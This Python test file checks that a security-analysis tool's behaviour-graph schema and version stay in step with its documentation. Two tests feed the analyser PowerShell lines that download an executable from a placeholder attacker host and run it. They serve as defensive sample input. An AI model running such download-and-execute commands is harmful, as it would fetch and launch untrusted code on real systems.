"""Behaviour Graph · schema-freeze regression.

Locks the canonical schema against silent drift. If any enum in
``behavior/models.py`` gains, loses, or renames a member, the
matching row in ``BEHAVIOR_GRAPH_SCHEMA.md`` MUST be updated and
:data:`BEHAVIOR_GRAPH_SCHEMA_VERSION` MUST bump in the SAME commit.

The test compares the runtime enums against the schema document
verbatim, then re-validates that every emitted graph advertises
the expected version. Zero tolerance for accidental changes.
"""
from __future__ import annotations

import os
import re

import pytest

from v2.investigation.behavior import (
    BEHAVIOR_GRAPH_SCHEMA_VERSION,
    BehaviorArgKind,
    BehaviorEdgeKind,
    BehaviorKind,
)
from v2.investigation.pipeline import investigate

_SCHEMA_PATH = os.path.join(
    os.path.dirname(__file__), "..", "..", "BEHAVIOR_GRAPH_SCHEMA.md"
)


@pytest.fixture(scope="module")
def schema_text() -> str:
    with open(_SCHEMA_PATH, "r", encoding="utf-8") as fh:
        return fh.read()


# ── Expected schema — source of truth for the freeze ───────────
# Any change to these sets requires a coordinated schema-version
# bump AND a matching update to BEHAVIOR_GRAPH_SCHEMA.md. Otherwise
# CI blocks the commit.
_EXPECTED_KIND_NAMES = {
    "download",
    "write_file",
    "execute",
    "remote_execution",
    "network_connection",
    "registry_modification",
    "process_creation",
    "persistence",
    "defense_evasion",
    "discovery",
    "credential_access",
    "runtime_dependent",
}
_EXPECTED_EDGE_NAMES = {"then", "writes_to", "executes", "targets"}
_EXPECTED_ARG_NAMES = {"url", "domain", "ip", "file", "registry", "process"}
_EXPECTED_SCHEMA_VERSION = "1.0.0"


def test_schema_version_constant_matches_expected():
    """The runtime constant must match the version this test suite
    was written for. Bumping the version is a *deliberate* action —
    do it here AND in the schema doc AND in ``behavior/models.py``."""
    assert BEHAVIOR_GRAPH_SCHEMA_VERSION == _EXPECTED_SCHEMA_VERSION, (
        f"BEHAVIOR_GRAPH_SCHEMA_VERSION drifted "
        f"(expected {_EXPECTED_SCHEMA_VERSION}, got {BEHAVIOR_GRAPH_SCHEMA_VERSION}). "
        "If this was intentional, update _EXPECTED_SCHEMA_VERSION here "
        "and BEHAVIOR_GRAPH_SCHEMA.md together."
    )


def test_behavior_kind_enum_locked():
    actual = {k.value for k in BehaviorKind}
    _assert_locked("BehaviorKind", actual, _EXPECTED_KIND_NAMES)


def test_behavior_edge_kind_enum_locked():
    actual = {k.value for k in BehaviorEdgeKind}
    _assert_locked("BehaviorEdgeKind", actual, _EXPECTED_EDGE_NAMES)


def test_behavior_arg_kind_enum_locked():
    actual = {k.value for k in BehaviorArgKind}
    _assert_locked("BehaviorArgKind", actual, _EXPECTED_ARG_NAMES)


def test_schema_document_advertises_current_version(schema_text):
    """The schema doc must self-declare the same version the code
    emits — no way for the two to drift silently."""
    m = re.search(r"Schema version:.*?`([0-9]+\.[0-9]+\.[0-9]+)`", schema_text)
    assert m, "BEHAVIOR_GRAPH_SCHEMA.md missing a `Schema version:` line"
    assert m.group(1) == BEHAVIOR_GRAPH_SCHEMA_VERSION, (
        f"Schema doc advertises {m.group(1)} but code emits "
        f"{BEHAVIOR_GRAPH_SCHEMA_VERSION} — bump both in the same commit."
    )


def test_schema_document_lists_every_kind(schema_text):
    for name in _EXPECTED_KIND_NAMES:
        assert f"`{name}`" in schema_text, (
            f"Behaviour kind `{name}` missing from BEHAVIOR_GRAPH_SCHEMA.md"
        )
    for name in _EXPECTED_EDGE_NAMES:
        assert f"`{name}`" in schema_text, (
            f"Edge kind `{name}` missing from BEHAVIOR_GRAPH_SCHEMA.md"
        )
    for name in _EXPECTED_ARG_NAMES:
        assert f"`{name}`" in schema_text, (
            f"Arg kind `{name}` missing from BEHAVIOR_GRAPH_SCHEMA.md"
        )


def test_emitted_graph_advertises_schema_version():
    """Every serialized graph must include the frozen version so
    downstream consumers can gate on it."""
    r = investigate(
        'Invoke-WebRequest http://evil.example.com/a.exe -OutFile a.exe; '
        'Start-Process a.exe'
    )
    bg = r.behavior.to_dict()
    assert bg.get("schema_version") == BEHAVIOR_GRAPH_SCHEMA_VERSION, (
        f"graph.to_dict() emitted {bg.get('schema_version')!r} "
        f"but expected {BEHAVIOR_GRAPH_SCHEMA_VERSION!r}"
    )
    report_bg = r.report.behavior_graph
    assert report_bg.get("schema_version") == BEHAVIOR_GRAPH_SCHEMA_VERSION


def test_behavior_shape_is_in_determinism_hash():
    """Regression guard for the existing behaviour-shape fold-in of
    the determinism hash — the shape must materially affect the hash."""
    r1 = investigate('Write-Host "Hello"')
    r2 = investigate(
        'Invoke-WebRequest http://x/a.exe -OutFile a.exe; Start-Process a.exe'
    )
    assert r1.determinism_hash != r2.determinism_hash


def _assert_locked(name: str, actual: set[str], expected: set[str]) -> None:
    added = actual - expected
    removed = expected - actual
    assert not added and not removed, (
        f"{name} membership drifted without a schema-version bump. "
        f"added={sorted(added)} removed={sorted(removed)}. "
        f"If this change was intentional:\n"
        f"  1. Update BEHAVIOR_GRAPH_SCHEMA.md with the new / removed members.\n"
        f"  2. Bump BEHAVIOR_GRAPH_SCHEMA_VERSION in behavior/models.py.\n"
        f"  3. Update the _EXPECTED_* sets and _EXPECTED_SCHEMA_VERSION "
        f"in tests/test_behavior_graph_schema_freeze.py."
    )
